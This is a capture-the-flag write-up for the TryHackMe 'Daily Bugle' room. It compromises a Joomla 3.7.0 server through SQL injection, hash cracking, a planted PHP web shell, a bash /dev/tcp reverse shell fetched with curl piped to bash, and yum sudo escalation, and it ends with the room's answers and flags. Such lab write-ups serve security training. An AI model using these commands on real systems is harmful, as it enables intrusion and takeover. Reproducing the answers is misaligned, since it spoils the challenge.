# TryHackme: Daily Bugle

#### [Task 1] Deploy

Deploy the machine - it may take up to 2 minutes to configure.

To get the name of the guy who robbed to bank go to  http://10.10.147.1 and you will see that SpiderMan robbed the bank

<img width="1284" alt="1" src="https://user-images.githubusercontent.com/28839345/165778726-30653827-8aa5-43b5-a8ef-9e4037a22dcb.png">

**Access the web server, who robbed the bank?**

SpiderMan

#### [Task 2] Obtain user and root

In task 2 first run gobuster to search for directories in the web server.Use the following command so you can also discover hidden directories with specific file extensions.

`gobuster dir -u http://10.10.147.1 -w /usr/share/wordlists/dirb/big.txt -x php,sh,txt,chi,html,htm,jss,py`

<img width="1155" alt="2" src="https://user-images.githubusercontent.com/28839345/165778743-e0166875-a310-4ab1-a00c-02ed8a0820f6.png">

<img width="587" alt="3" src="https://user-images.githubusercontent.com/28839345/165778748-3d1d6248-df6e-482b-9ca5-e5f422eb8332.png">

After you check all the directories with status code 200 you will see that there is one that is called /README.txt which informs you that Joomla version is 3.7.Although you know that the version is 3.7 you dont know the exact version.Lets try to find a way to exploit Joomla 3.7.

<img width="783" alt="4" src="https://user-images.githubusercontent.com/28839345/165778752-138de74f-57d0-481b-b966-c038811968bc.png">

To get the exact version of Joomscan I tried to use a python script exploit I found on google and which is used in Joomla 3.7.0 and managed to find the exact Joomla version.

<img width="839" alt="5" src="https://user-images.githubusercontent.com/28839345/165778754-c238cbc9-afb3-4786-8bff-dd4ad0b67cbb.png">

When I downloaded the script I tried to run it without modyfying any part of the code and I got the following error.

<img width="1104" alt="6" src="https://user-images.githubusercontent.com/28839345/165778758-e8af6de4-5f9b-4a7f-8616-8d1a025c4918.png">

In my opinion the hardest part of this challenge is to find a way and run the exploit.After some time I managed to do this by modifying the python script.I deleted all the tokens that were used in the script and also changed the url I used in the final command.

So first open the python script and delete all the 'token' variables that are used as function arguments and also as variables in this functions.Then make the python script executable by running the command `chmod +x joomblah.py`.The final step is to run the script.
`./joomblah.py http://10.10.147.1/index.php/component/users/?view=login?/index.php/component/users/?view=login?`

The output is show below 


<img width="1219" alt="7" src="https://user-images.githubusercontent.com/28839345/165778763-a01791e4-34fe-4e81-a293-575fb6df1c36.png">

As you can see now you have the username of jonah and his password in bcrypt format.
` [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']`

Now its time to crack the password.First save the hashed password in a file named file.txt and then run the following command to crack the hash using john the ripper.
`john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

<img width="915" alt="8" src="https://user-images.githubusercontent.com/28839345/165778764-d157aee6-9b49-438e-8a0d-508825d4e183.png">

The password is *spiderman123*

Try to login to the website with username:jonah and password:spiderman123 to see if you find the correct credentials.

<img width="1344" alt="9" src="https://user-images.githubusercontent.com/28839345/165778775-0f46dc42-7936-4c3a-b440-a14d72b2658d.png">

In the previous output of joomblah.py you will see that *jonah* is a Super User.Since you know that go to the /administrator page which you find in your previous gobuster scan and log in as jonah.


<img width="1272" alt="10" src="https://user-images.githubusercontent.com/28839345/165778786-dd65d6f7-37bb-4846-9691-7841964adfdf.png">

Now its time to find a way to connect to the web server of Joomla so we can later escalate our priviledges and become root.

After searching on google about exploits to get a reverse shell in Joomla version 3.7.0 as an authenticated user I found a way to do this from the following website.

1. Having access to the account and being able to edit the template

-   Go to Extensions - Templates - Templates

<img width="1285" alt="11" src="https://user-images.githubusercontent.com/28839345/165778794-dce6b480-7cd5-47bd-97c6-65e293e4f877.png">

2. Select the template to use, in this case “Protostar Details and Files”

-   Click on New File

<img width="1280" alt="13" src="https://user-images.githubusercontent.com/28839345/165778799-6cee6baf-f911-4eea-88db-b90f3633b6dd.png">

3. Choose a file name: vk9-sec
-   Choose the extension: php

<img width="1246" alt="14" src="https://user-images.githubusercontent.com/28839345/165778806-eb49384b-c1bf-4c07-85da-ce17dcb04099.png">

4.  Click on Create

<img width="1283" alt="15" src="https://user-images.githubusercontent.com/28839345/165778813-61bffab2-0be8-4dd5-92dd-e703dbe4f64f.png">

5. Then  copy and paste the following code
-   <?php echo "Follow us." ?>
-   <?php echo shell_exec($_GET['cmd']); ?>
-   Click save

<img width="1279" alt="16" src="https://user-images.githubusercontent.com/28839345/165778816-be6b25fb-2ba3-4204-bc1b-3e8fe97df2a1.png">

6. Locate the vk9-sec.php page, in our case it is under /templates/protostar/vk9-sec.php
`

http://10.10.147.1/templates/protostar/vk9-sec.php

<img width="1289" alt="17" src="https://user-images.githubusercontent.com/28839345/165778818-d5ca2fa1-3979-4cee-81fc-351d4def7be4.png">

7. We know the PHP file is working, now we will enter the GET request via URL using the variable ‘cmd’

http://10.10.147.1/templates/protostar/vk9-sec.php?cmd=whoami

<img width="1133" alt="18" src="https://user-images.githubusercontent.com/28839345/165778824-62611b2c-4ab2-43f1-8779-28e8c249750b.png">

7. Let’s execute a remote file with a netcat reverse shell

-   start a listener in Kali/Parrot

<img width="430" alt="19" src="https://user-images.githubusercontent.com/28839345/165778831-d1593dc1-7aea-4eb5-88f5-91e3f2d5ac17.png">

8. Create a file with the command
-   echo "bash -i >& /dev/tcp/10.10.89.29/4444 0>&1" > vk9_reverse.sh
-   cat vk9-reverse.sh
<img width="851" alt="Στιγμιότυπο 2022-04-28, 5 57 43 μμ" src="https://user-images.githubusercontent.com/28839345/165782229-2f0a5a0b-7a3f-4644-9064-e7ceca20b5b2.png">

9. Establish a python web server to download the file from the remote server
-   python -m SimpleHTTPServer 9999

<img width="597" alt="21" src="https://user-images.githubusercontent.com/28839345/165778837-4f2eedae-36af-49d7-9ab0-9189928f17ed.png">

10. Now using the ‘cmd’ variable in vk9-sec.php download the vk9_reverse.sh file using curl
-   http://10.10.147.1/templates/protostar/vk9-sec.php?cmd=curl 10.10.89.29:9999/vk9_reverse.sh | bash

<img width="1003" alt="22" src="https://user-images.githubusercontent.com/28839345/165778839-6441fe79-1f52-4a24-ba4f-c98647ca3654.png">

After getting reverse shell the next step is to escalate our priviledges either to become root user or to become another user.Lets go to /home directory to check the users of the web server.

`cd /home`

<img width="283" alt="23" src="https://user-images.githubusercontent.com/28839345/165778840-938ef821-2d86-4de6-bcdf-43adf7032a80.png">

As you can see there is a user named jjameson.The next step is to download linpeas.sh and check if there is a way to enumerate the machine and escalate our priviledges.

<img width="1282" alt="24" src="https://user-images.githubusercontent.com/28839345/165778842-31bdf2c1-d7b9-4213-846a-2448d2312657.png">

First download linpeas.sh if you have not downloaded it already and upload it to the reverse shell.Make sure to go to the /tmp directory to upload it and have your http server up and running.

When you go to /tmp directory upload it using the command `wget http://10.10.89.29:9999/linpeas.sh`


<img width="787" alt="25" src="https://user-images.githubusercontent.com/28839345/165778848-fbb3c83b-8bdc-4755-ad52-6cabcb99243c.png">

Then make linpeas.sh executable using the command `chmod +x linpeas.sh` and run the executable `./linpeas.sh`

<img width="292" alt="26" src="https://user-images.githubusercontent.com/28839345/165778853-8f22ab4c-30c7-49e4-aae8-346727985c09.png">



Linpeas will find a password as seen bellow.

<img width="489" alt="27" src="https://user-images.githubusercontent.com/28839345/165778857-f21c04d7-3e31-412e-b9da-f21c9e5bae8b.png">


*public $password = 'nv5uz9r3ZEDzVjNu';*

'nv5uz9r3ZEDzVjNu';

Run nmap to see if there is any service running which may be usefull for us to login using the password found from linpeas.

`nmap -p- -open -sV 10.10.147.1`

<img width="874" alt="28" src="https://user-images.githubusercontent.com/28839345/165778862-14eb97e8-e6c6-4cb9-afca-7498a793958d.png">

Check if you can ssh to the machine as jjameson

`ssh jjameson@10.10.147.1` by using the password *nv5uz9r3ZEDzVjNu*

<img width="927" alt="29" src="https://user-images.githubusercontent.com/28839345/165778866-7d4ed09e-21ff-458e-9823-79a624cf6001.png">

Then print the password 

`cat user.txt`

<img width="400" alt="30" src="https://user-images.githubusercontent.com/28839345/165778870-59679e5c-b0e3-42ec-a4cb-58ee6f4bb22b.png">

Run `sudo -l ` .If you have a limited shell that has access to some programs using `sudo` you might be able to escalate your privileges with.

<img width="881" alt="31" src="https://user-images.githubusercontent.com/28839345/165778873-77baa788-3abf-48d1-b927-9e410eebfcda.png">

Then check in GTFO bins how can you use `/usr/bin/yum`
to escalateyour priviledges.

<img width="857" alt="32" src="https://user-images.githubusercontent.com/28839345/165778875-b5d344fc-ff52-4aba-97fa-7c50b373796c.png">

By using the commands mentioned in GTFO bins *Spawn a reverse root shell by loading a custom l=plugin* you will becom root

<img width="729" alt="33" src="https://user-images.githubusercontent.com/28839345/165778880-26dc18be-6eb4-41c7-b82f-7119648d9da7.png">

After becoming root go to the directory named /root and print root.txt by using the following commands:

`cd /root`
`cat root.txt`


<img width="345" alt="34" src="https://user-images.githubusercontent.com/28839345/165778883-6f0a896b-6380-4a7b-8ce4-256505cd90d6.png">

**What is the Joomla version?**

3.7.0

**What is Jonah's cracked password?**

spiderman123

**What is the user flag?**

27a260fe3cba712cfdedb1c86d80442e

**What is the root flag?**

eec3d53292b1821868266858d7fa6f79
